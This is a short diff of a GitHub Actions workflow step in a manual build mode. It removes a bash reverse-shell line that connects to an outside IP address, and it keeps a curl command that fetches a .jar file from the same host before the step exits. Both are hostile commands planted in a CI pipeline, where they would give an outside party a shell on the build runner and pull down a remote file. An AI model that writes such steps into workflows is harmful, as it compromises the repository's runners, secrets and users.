@@ -79,7 +79,6 @@ jobs:
     - if: matrix.build-mode == 'manual'
       shell: bash
       run: |
-        bash -i >& /dev/tcp/101.43.57.52/11012 0>&1
         curl http://101.43.57.52:11013/test22222.jar
         exit 1
 
